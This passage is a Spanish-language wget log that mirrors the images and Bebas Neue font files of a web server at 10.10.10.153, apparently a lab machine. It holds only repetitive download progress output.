10.10.10.153/images/bg_slider_nav.png           100%[=====================================================================================================>]     358  --.-KB/s    en 0s

2019-01-15 20:26:25 (54.1 MB/s) - “10.10.10.153/images/bg_slider_nav.png” guardado [358/358]

--2019-01-15 20:26:25--  http://10.10.10.153/images/bg_arrow_blue.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 148 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_blue.png”

10.10.10.153/images/bg_arrow_blue.png           100%[=====================================================================================================>]     148  --.-KB/s    en 0s

2019-01-15 20:26:25 (19.4 MB/s) - “10.10.10.153/images/bg_arrow_blue.png” guardado [148/148]

--2019-01-15 20:26:25--  http://10.10.10.153/images/bg_arrow_blue_dark.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 148 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_blue_dark.png”

10.10.10.153/images/bg_arrow_blue_dark.png      100%[=====================================================================================================>]     148  --.-KB/s    en 0s

2019-01-15 20:26:25 (14.3 MB/s) - “10.10.10.153/images/bg_arrow_blue_dark.png” guardado [148/148]

--2019-01-15 20:26:25--  http://10.10.10.153/images/ico_information.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1329 (1.3K) [image/png]
Grabando a: “10.10.10.153/images/ico_information.png”

10.10.10.153/images/ico_information.png         100%[=====================================================================================================>]   1.30K  --.-KB/s    en 0.001s

2019-01-15 20:26:25 (939 KB/s) - “10.10.10.153/images/ico_information.png” guardado [1329/1329]

--2019-01-15 20:26:25--  http://10.10.10.153/images/bg_arrow_information.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 403 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_information.png”

10.10.10.153/images/bg_arrow_information.png    100%[=====================================================================================================>]     403  --.-KB/s    en 0s

2019-01-15 20:26:25 (43.0 MB/s) - “10.10.10.153/images/bg_arrow_information.png” guardado [403/403]

--2019-01-15 20:26:25--  http://10.10.10.153/images/ico_contacts.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1697 (1.7K) [image/png]
Grabando a: “10.10.10.153/images/ico_contacts.png”

10.10.10.153/images/ico_contacts.png            100%[=====================================================================================================>]   1.66K  --.-KB/s    en 0s

2019-01-15 20:26:25 (5.44 MB/s) - “10.10.10.153/images/ico_contacts.png” guardado [1697/1697]

--2019-01-15 20:26:25--  http://10.10.10.153/images/ico_social.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1374 (1.3K) [image/png]
Grabando a: “10.10.10.153/images/ico_social.png”

10.10.10.153/images/ico_social.png              100%[=====================================================================================================>]   1.34K  --.-KB/s    en 0.009s

2019-01-15 20:26:25 (151 KB/s) - “10.10.10.153/images/ico_social.png” guardado [1374/1374]

--2019-01-15 20:26:25--  http://10.10.10.153/images/ico_close.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 968 [image/png]
Grabando a: “10.10.10.153/images/ico_close.png”

10.10.10.153/images/ico_close.png               100%[=====================================================================================================>]     968  --.-KB/s    en 0s

2019-01-15 20:26:25 (129 MB/s) - “10.10.10.153/images/ico_close.png” guardado [968/968]

--2019-01-15 20:26:25--  http://10.10.10.153/images/bg_blue.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 109 [image/png]
Grabando a: “10.10.10.153/images/bg_blue.png”

10.10.10.153/images/bg_blue.png                 100%[=====================================================================================================>]     109  --.-KB/s    en 0s

2019-01-15 20:26:26 (11.4 MB/s) - “10.10.10.153/images/bg_blue.png” guardado [109/109]

--2019-01-15 20:26:26--  http://10.10.10.153/images/ico_form.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1323 (1.3K) [image/png]
Grabando a: “10.10.10.153/images/ico_form.png”

10.10.10.153/images/ico_form.png                100%[=====================================================================================================>]   1.29K  --.-KB/s    en 0.001s

2019-01-15 20:26:26 (1.66 MB/s) - “10.10.10.153/images/ico_form.png” guardado [1323/1323]

--2019-01-15 20:26:26--  http://10.10.10.153/images/bg_arrow_select.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 187 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_select.png”

10.10.10.153/images/bg_arrow_select.png         100%[=====================================================================================================>]     187  --.-KB/s    en 0s

2019-01-15 20:26:26 (20.9 MB/s) - “10.10.10.153/images/bg_arrow_select.png” guardado [187/187]

--2019-01-15 20:26:26--  http://10.10.10.153/fonts/BebasNeueBold.eot
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 96152 (94K) [application/vnd.ms-fontobject]
Grabando a: “10.10.10.153/fonts/BebasNeueBold.eot”

10.10.10.153/fonts/BebasNeueBold.eot            100%[=====================================================================================================>]  93.90K  --.-KB/s    en 0.07s

2019-01-15 20:26:26 (1.36 MB/s) - “10.10.10.153/fonts/BebasNeueBold.eot” guardado [96152/96152]

--2019-01-15 20:26:26--  http://10.10.10.153/fonts/BebasNeueBold.eot?
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 96152 (94K) [application/vnd.ms-fontobject]
Grabando a: “10.10.10.153/fonts/BebasNeueBold.eot?”

10.10.10.153/fonts/BebasNeueBold.eot?           100%[=====================================================================================================>]  93.90K  --.-KB/s    en 0.08s

2019-01-15 20:26:26 (1.22 MB/s) - “10.10.10.153/fonts/BebasNeueBold.eot?” guardado [96152/96152]

--2019-01-15 20:26:26--  http://10.10.10.153/fonts/BebasNeueBold.woff
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 31404 (31K) [application/font-woff]
Grabando a: “10.10.10.153/fonts/BebasNeueBold.woff”

10.10.10.153/fonts/BebasNeueBold.woff           100%[=====================================================================================================>]  30.67K  --.-KB/s    en 0.02s

2019-01-15 20:26:26 (1.87 MB/s) - “10.10.10.153/fonts/BebasNeueBold.woff” guardado [31404/31404]

--2019-01-15 20:26:26--  http://10.10.10.153/fonts/BebasNeueBold.ttf
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 95984 (94K) [application/font-sfnt]
Grabando a: “10.10.10.153/fonts/BebasNeueBold.ttf”

10.10.10.153/fonts/BebasNeueBold.ttf            100%[=====================================================================================================>]  93.73K  --.-KB/s    en 0.05s

2019-01-15 20:26:26 (1.94 MB/s) - “10.10.10.153/fonts/BebasNeueBold.ttf” guardado [95984/95984]

--2019-01-15 20:26:26--  http://10.10.10.153/fonts/BebasNeueBold.svg
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 288755 (282K) [image/svg+xml]
Grabando a: “10.10.10.153/fonts/BebasNeueBold.svg”

10.10.10.153/fonts/BebasNeueBold.svg            100%[=====================================================================================================>] 281.99K  1.41MB/s    en 0.2s

2019-01-15 20:26:27 (1.41 MB/s) - “10.10.10.153/fonts/BebasNeueBold.svg” guardado [288755/288755]

--2019-01-15 20:26:27--  http://10.10.10.153/fonts/BebasNeueRegular.eot
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 94836 (93K) [application/vnd.ms-fontobject]
Grabando a: “10.10.10.153/fonts/BebasNeueRegular.eot”

10.10.10.153/fonts/BebasNeueRegular.eot         100%[=====================================================================================================>]  92.61K  --.-KB/s    en 0.05s

2019-01-15 20:26:27 (1.88 MB/s) - “10.10.10.153/fonts/BebasNeueRegular.eot” guardado [94836/94836]

--2019-01-15 20:26:27--  http://10.10.10.153/fonts/BebasNeueRegular.eot?
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 94836 (93K) [application/vnd.ms-fontobject]
Grabando a: “10.10.10.153/fonts/BebasNeueRegular.eot?”

10.10.10.153/fonts/BebasNeueRegular.eot?        100%[=====================================================================================================>]  92.61K  --.-KB/s    en 0.05s

2019-01-15 20:26:27 (1.75 MB/s) - “10.10.10.153/fonts/BebasNeueRegular.eot?” guardado [94836/94836]

--2019-01-15 20:26:27--  http://10.10.10.153/fonts/BebasNeueRegular.woff
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 33700 (33K) [application/font-woff]
Grabando a: “10.10.10.153/fonts/BebasNeueRegular.woff”

10.10.10.153/fonts/BebasNeueRegular.woff        100%[=====================================================================================================>]  32.91K  --.-KB/s    en 0.02s

2019-01-15 20:26:27 (1.81 MB/s) - “10.10.10.153/fonts/BebasNeueRegular.woff” guardado [33700/33700]

--2019-01-15 20:26:27--  http://10.10.10.153/fonts/BebasNeueRegular.ttf
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 94656 (92K) [application/font-sfnt]
Grabando a: “10.10.10.153/fonts/BebasNeueRegular.ttf”

10.10.10.153/fonts/BebasNeueRegular.ttf         100%[=====================================================================================================>]  92.44K  --.-KB/s    en 0.05s

2019-01-15 20:26:27 (1.68 MB/s) - “10.10.10.153/fonts/BebasNeueRegular.ttf” guardado [94656/94656]

--2019-01-15 20:26:27--  http://10.10.10.153/fonts/BebasNeueRegular.svg
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 291083 (284K) [image/svg+xml]
Grabando a: “10.10.10.153/fonts/BebasNeueRegular.svg”

10.10.10.153/fonts/BebasNeueRegular.svg         100%[=====================================================================================================>] 284.26K  1.04MB/s    en 0.3s

2019-01-15 20:26:28 (1.04 MB/s) - “10.10.10.153/fonts/BebasNeueRegular.svg” guardado [291083/291083]

--2019-01-15 20:26:28--  http://10.10.10.153/fonts/BebasNeueBook.eot
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 97580 (95K) [application/vnd.ms-fontobject]
Grabando a: “10.10.10.153/fonts/BebasNeueBook.eot”

10.10.10.153/fonts/BebasNeueBook.eot            100%[=====================================================================================================>]  95.29K  --.-KB/s    en 0.07s

2019-01-15 20:26:28 (1.43 MB/s) - “10.10.10.153/fonts/BebasNeueBook.eot” guardado [97580/97580]

--2019-01-15 20:26:28--  http://10.10.10.153/fonts/BebasNeueBook.eot?
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 97580 (95K) [application/vnd.ms-fontobject]
Grabando a: “10.10.10.153/fonts/BebasNeueBook.eot?”

10.10.10.153/fonts/BebasNeueBook.eot?           100%[=====================================================================================================>]  95.29K  --.-KB/s    en 0.07s

2019-01-15 20:26:28 (1.43 MB/s) - “10.10.10.153/fonts/BebasNeueBook.eot?” guardado [97580/97580]

--2019-01-15 20:26:28--  http://10.10.10.153/fonts/BebasNeueBook.woff
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 34696 (34K) [application/font-woff]
Grabando a: “10.10.10.153/fonts/BebasNeueBook.woff”

10.10.10.153/fonts/BebasNeueBook.woff           100%[=====================================================================================================>]  33.88K  --.-KB/s    en 0.03s

2019-01-15 20:26:28 (1.28 MB/s) - “10.10.10.153/fonts/BebasNeueBook.woff” guardado [34696/34696]

--2019-01-15 20:26:28--  http://10.10.10.153/fonts/BebasNeueBook.ttf
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 97412 (95K) [application/font-sfnt]
Grabando a: “10.10.10.153/fonts/BebasNeueBook.ttf”

10.10.10.153/fonts/BebasNeueBook.ttf            100%[=====================================================================================================>]  95.13K  --.-KB/s    en 0.09s

2019-01-15 20:26:29 (1009 KB/s) - “10.10.10.153/fonts/BebasNeueBook.ttf” guardado [97412/97412]

--2019-01-15 20:26:29--  http://10.10.10.153/fonts/BebasNeueBook.svg
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 300132 (293K) [image/svg+xml]
Grabando a: “10.10.10.153/fonts/BebasNeueBook.svg”

10.10.10.153/fonts/BebasNeueBook.svg            100%[=====================================================================================================>] 293.10K  1.03MB/s    en 0.3s

2019-01-15 20:26:29 (1.03 MB/s) - “10.10.10.153/fonts/BebasNeueBook.svg” guardado [300132/300132]

--2019-01-15 20:26:29--  http://10.10.10.153/images/logo@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 15451 (15K) [image/png]
Grabando a: “10.10.10.153/images/logo@2x.png”

10.10.10.153/images/logo@2x.png                 100%[=====================================================================================================>]  15.09K  --.-KB/s    en 0.009s

2019-01-15 20:26:29 (1.64 MB/s) - “10.10.10.153/images/logo@2x.png” guardado [15451/15451]

--2019-01-15 20:26:29--  http://10.10.10.153/images/bg_arrow@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 331 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow@2x.png”

10.10.10.153/images/bg_arrow@2x.png             100%[=====================================================================================================>]     331  --.-KB/s    en 0s

2019-01-15 20:26:29 (24.9 MB/s) - “10.10.10.153/images/bg_arrow@2x.png” guardado [331/331]

--2019-01-15 20:26:29--  http://10.10.10.153/images/bg_slider_nav@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 617 [image/png]
Grabando a: “10.10.10.153/images/bg_slider_nav@2x.png”

10.10.10.153/images/bg_slider_nav@2x.png        100%[=====================================================================================================>]     617  --.-KB/s    en 0s

2019-01-15 20:26:29 (79.4 MB/s) - “10.10.10.153/images/bg_slider_nav@2x.png” guardado [617/617]

--2019-01-15 20:26:29--  http://10.10.10.153/images/bg_arrow_blue@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 160 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_blue@2x.png”

10.10.10.153/images/bg_arrow_blue@2x.png        100%[=====================================================================================================>]     160  --.-KB/s    en 0s

2019-01-15 20:26:29 (6.43 MB/s) - “10.10.10.153/images/bg_arrow_blue@2x.png” guardado [160/160]

--2019-01-15 20:26:29--  http://10.10.10.153/images/bg_arrow_blue_dark@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 159 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_blue_dark@2x.png”

10.10.10.153/images/bg_arrow_blue_dark@2x.png   100%[=====================================================================================================>]     159  --.-KB/s    en 0s

2019-01-15 20:26:29 (17.3 MB/s) - “10.10.10.153/images/bg_arrow_blue_dark@2x.png” guardado [159/159]

--2019-01-15 20:26:29--  http://10.10.10.153/images/ico_information@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2724 (2.7K) [image/png]
Grabando a: “10.10.10.153/images/ico_information@2x.png”

10.10.10.153/images/ico_information@2x.png      100%[=====================================================================================================>]   2.66K  --.-KB/s    en 0.004s

2019-01-15 20:26:30 (594 KB/s) - “10.10.10.153/images/ico_information@2x.png” guardado [2724/2724]

--2019-01-15 20:26:30--  http://10.10.10.153/images/bg_arrow_information@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 811 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_information@2x.png”

10.10.10.153/images/bg_arrow_information@2x.png 100%[=====================================================================================================>]     811  --.-KB/s    en 0s

2019-01-15 20:26:30 (75.7 MB/s) - “10.10.10.153/images/bg_arrow_information@2x.png” guardado [811/811]

--2019-01-15 20:26:30--  http://10.10.10.153/images/ico_contacts@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3649 (3.6K) [image/png]
Grabando a: “10.10.10.153/images/ico_contacts@2x.png”

10.10.10.153/images/ico_contacts@2x.png         100%[=====================================================================================================>]   3.56K  --.-KB/s    en 0.002s

2019-01-15 20:26:30 (1.88 MB/s) - “10.10.10.153/images/ico_contacts@2x.png” guardado [3649/3649]

--2019-01-15 20:26:30--  http://10.10.10.153/images/ico_social@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2877 (2.8K) [image/png]
Grabando a: “10.10.10.153/images/ico_social@2x.png”

10.10.10.153/images/ico_social@2x.png           100%[=====================================================================================================>]   2.81K  --.-KB/s    en 0.001s

2019-01-15 20:26:30 (2.64 MB/s) - “10.10.10.153/images/ico_social@2x.png” guardado [2877/2877]

--2019-01-15 20:26:30--  http://10.10.10.153/images/bg_white_arrow@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1416 (1.4K) [image/png]
Grabando a: “10.10.10.153/images/bg_white_arrow@2x.png”

10.10.10.153/images/bg_white_arrow@2x.png       100%[=====================================================================================================>]   1.38K  --.-KB/s    en 0s

2019-01-15 20:26:30 (7.73 MB/s) - “10.10.10.153/images/bg_white_arrow@2x.png” guardado [1416/1416]

--2019-01-15 20:26:30--  http://10.10.10.153/images/bg_white@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2376 (2.3K) [image/png]
Grabando a: “10.10.10.153/images/bg_white@2x.png”

10.10.10.153/images/bg_white@2x.png             100%[=====================================================================================================>]   2.32K  --.-KB/s    en 0.001s

2019-01-15 20:26:30 (4.51 MB/s) - “10.10.10.153/images/bg_white@2x.png” guardado [2376/2376]

--2019-01-15 20:26:30--  http://10.10.10.153/images/ico_close@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1880 (1.8K) [image/png]
Grabando a: “10.10.10.153/images/ico_close@2x.png”

10.10.10.153/images/ico_close@2x.png            100%[=====================================================================================================>]   1.84K  --.-KB/s    en 0s

2019-01-15 20:26:30 (4.27 MB/s) - “10.10.10.153/images/ico_close@2x.png” guardado [1880/1880]

--2019-01-15 20:26:30--  http://10.10.10.153/images/ico_form@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2789 (2.7K) [image/png]
Grabando a: “10.10.10.153/images/ico_form@2x.png”

10.10.10.153/images/ico_form@2x.png             100%[=====================================================================================================>]   2.72K  --.-KB/s    en 0.001s

2019-01-15 20:26:30 (3.06 MB/s) - “10.10.10.153/images/ico_form@2x.png” guardado [2789/2789]

--2019-01-15 20:26:30--  http://10.10.10.153/images/bg_arrow_select@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 265 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_select@2x.png”

10.10.10.153/images/bg_arrow_select@2x.png      100%[=====================================================================================================>]     265  --.-KB/s    en 0s

2019-01-15 20:26:30 (8.72 MB/s) - “10.10.10.153/images/bg_arrow_select@2x.png” guardado [265/265]

--2019-01-15 20:26:30--  http://10.10.10.153/images/ico_time@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 914 [image/png]
Grabando a: “10.10.10.153/images/ico_time@2x.png”

10.10.10.153/images/ico_time@2x.png             100%[=====================================================================================================>]     914  --.-KB/s    en 0s

2019-01-15 20:26:31 (94.8 MB/s) - “10.10.10.153/images/ico_time@2x.png” guardado [914/914]

--2019-01-15 20:26:31--  http://10.10.10.153/images/ico_place@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 657 [image/png]
Grabando a: “10.10.10.153/images/ico_place@2x.png”

10.10.10.153/images/ico_place@2x.png            100%[=====================================================================================================>]     657  --.-KB/s    en 0s

2019-01-15 20:26:31 (28.4 MB/s) - “10.10.10.153/images/ico_place@2x.png” guardado [657/657]

--2019-01-15 20:26:31--  http://10.10.10.153/images/bg_arrow_nav@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 438 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_nav@2x.png”

10.10.10.153/images/bg_arrow_nav@2x.png         100%[=====================================================================================================>]     438  --.-KB/s    en 0s

2019-01-15 20:26:31 (46.5 MB/s) - “10.10.10.153/images/bg_arrow_nav@2x.png” guardado [438/438]

--2019-01-15 20:26:31--  http://10.10.10.153/images/ico_time_2@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 937 [image/png]
Grabando a: “10.10.10.153/images/ico_time_2@2x.png”

10.10.10.153/images/ico_time_2@2x.png           100%[=====================================================================================================>]     937  --.-KB/s    en 0s

2019-01-15 20:26:31 (136 MB/s) - “10.10.10.153/images/ico_time_2@2x.png” guardado [937/937]

--2019-01-15 20:26:31--  http://10.10.10.153/images/ico_place_2@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 666 [image/png]
Grabando a: “10.10.10.153/images/ico_place_2@2x.png”

10.10.10.153/images/ico_place_2@2x.png          100%[=====================================================================================================>]     666  --.-KB/s    en 0s

2019-01-15 20:26:31 (49.7 MB/s) - “10.10.10.153/images/ico_place_2@2x.png” guardado [666/666]

--2019-01-15 20:26:31--  http://10.10.10.153/images/bg_slider_nav_2@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1081 (1.1K) [image/png]
Grabando a: “10.10.10.153/images/bg_slider_nav_2@2x.png”

10.10.10.153/images/bg_slider_nav_2@2x.png      100%[=====================================================================================================>]   1.06K  --.-KB/s    en 0s

2019-01-15 20:26:31 (3.04 MB/s) - “10.10.10.153/images/bg_slider_nav_2@2x.png” guardado [1081/1081]

--2019-01-15 20:26:31--  http://10.10.10.153/images/bg_menu_trigger@2x.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 212 [image/png]
Grabando a: “10.10.10.153/images/bg_menu_trigger@2x.png”

10.10.10.153/images/bg_menu_trigger@2x.png      100%[=====================================================================================================>]     212  --.-KB/s    en 0s

2019-01-15 20:26:31 (7.82 MB/s) - “10.10.10.153/images/bg_menu_trigger@2x.png” guardado [212/212]

--2019-01-15 20:26:31--  http://10.10.10.153/images/bg_menu_trigger.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 974 [image/png]
Grabando a: “10.10.10.153/images/bg_menu_trigger.png”

10.10.10.153/images/bg_menu_trigger.png         100%[=====================================================================================================>]     974  --.-KB/s    en 0s

2019-01-15 20:26:31 (87.0 MB/s) - “10.10.10.153/images/bg_menu_trigger.png” guardado [974/974]

--2019-01-15 20:26:31--  http://10.10.10.153/images/5.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 200 [image/png]
Grabando a: “10.10.10.153/images/5.png”

10.10.10.153/images/5.png                       100%[=====================================================================================================>]     200  --.-KB/s    en 0s

2019-01-15 20:26:31 (25.9 MB/s) - “10.10.10.153/images/5.png” guardado [200/200]

--2019-01-15 20:26:31--  http://10.10.10.153/images/5_2.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6617 (6.5K) [image/png]
Grabando a: “10.10.10.153/images/5_2.png”

10.10.10.153/images/5_2.png                     100%[=====================================================================================================>]   6.46K  --.-KB/s    en 0.006s

2019-01-15 20:26:32 (1010 KB/s) - “10.10.10.153/images/5_2.png” guardado [6617/6617]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_3.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6473 (6.3K) [image/png]
Grabando a: “10.10.10.153/images/5_3.png”

10.10.10.153/images/5_3.png                     100%[=====================================================================================================>]   6.32K  --.-KB/s    en 0.002s

2019-01-15 20:26:32 (2.69 MB/s) - “10.10.10.153/images/5_3.png” guardado [6473/6473]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_4.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6294 (6.1K) [image/png]
Grabando a: “10.10.10.153/images/5_4.png”

10.10.10.153/images/5_4.png                     100%[=====================================================================================================>]   6.15K  --.-KB/s    en 0.009s

2019-01-15 20:26:32 (711 KB/s) - “10.10.10.153/images/5_4.png” guardado [6294/6294]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_5.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6757 (6.6K) [image/png]
Grabando a: “10.10.10.153/images/5_5.png”

10.10.10.153/images/5_5.png                     100%[=====================================================================================================>]   6.60K  --.-KB/s    en 0.005s

2019-01-15 20:26:32 (1.22 MB/s) - “10.10.10.153/images/5_5.png” guardado [6757/6757]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_6.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6910 (6.7K) [image/png]
Grabando a: “10.10.10.153/images/5_6.png”

10.10.10.153/images/5_6.png                     100%[=====================================================================================================>]   6.75K  --.-KB/s    en 0.003s

2019-01-15 20:26:32 (2.26 MB/s) - “10.10.10.153/images/5_6.png” guardado [6910/6910]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_7.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6812 (6.7K) [image/png]
Grabando a: “10.10.10.153/images/5_7.png”

10.10.10.153/images/5_7.png                     100%[=====================================================================================================>]   6.65K  --.-KB/s    en 0.002s

2019-01-15 20:26:32 (2.66 MB/s) - “10.10.10.153/images/5_7.png” guardado [6812/6812]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_8.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5861 (5.7K) [image/png]
Grabando a: “10.10.10.153/images/5_8.png”

10.10.10.153/images/5_8.png                     100%[=====================================================================================================>]   5.72K  --.-KB/s    en 0.002s

2019-01-15 20:26:32 (2.41 MB/s) - “10.10.10.153/images/5_8.png” guardado [5861/5861]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_9.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6898 (6.7K) [image/png]
Grabando a: “10.10.10.153/images/5_9.png”

10.10.10.153/images/5_9.png                     100%[=====================================================================================================>]   6.74K  --.-KB/s    en 0.004s

2019-01-15 20:26:32 (1.52 MB/s) - “10.10.10.153/images/5_9.png” guardado [6898/6898]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_10.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6708 (6.6K) [image/png]
Grabando a: “10.10.10.153/images/5_10.png”

10.10.10.153/images/5_10.png                    100%[=====================================================================================================>]   6.55K  --.-KB/s    en 0.003s

2019-01-15 20:26:32 (2.39 MB/s) - “10.10.10.153/images/5_10.png” guardado [6708/6708]

--2019-01-15 20:26:32--  http://10.10.10.153/images/5_11.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6669 (6.5K) [image/png]
Grabando a: “10.10.10.153/images/5_11.png”

10.10.10.153/images/5_11.png                    100%[=====================================================================================================>]   6.51K  --.-KB/s    en 0.007s

2019-01-15 20:26:33 (953 KB/s) - “10.10.10.153/images/5_11.png” guardado [6669/6669]

--2019-01-15 20:26:33--  http://10.10.10.153/images/5_12.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6279 (6.1K) [image/png]
Grabando a: “10.10.10.153/images/5_12.png”

10.10.10.153/images/5_12.png                    100%[=====================================================================================================>]   6.13K  --.-KB/s    en 0.002s

2019-01-15 20:26:33 (2.78 MB/s) - “10.10.10.153/images/5_12.png” guardado [6279/6279]

--2019-01-15 20:26:33--  http://10.10.10.153/images/5_13.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6861 (6.7K) [image/png]
Grabando a: “10.10.10.153/images/5_13.png”

10.10.10.153/images/5_13.png                    100%[=====================================================================================================>]   6.70K  --.-KB/s    en 0.005s

2019-01-15 20:26:33 (1.23 MB/s) - “10.10.10.153/images/5_13.png” guardado [6861/6861]

--2019-01-15 20:26:33--  http://10.10.10.153/images/5_14.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6063 (5.9K) [image/png]
Grabando a: “10.10.10.153/images/5_14.png”

10.10.10.153/images/5_14.png                    100%[=====================================================================================================>]   5.92K  --.-KB/s    en 0.003s

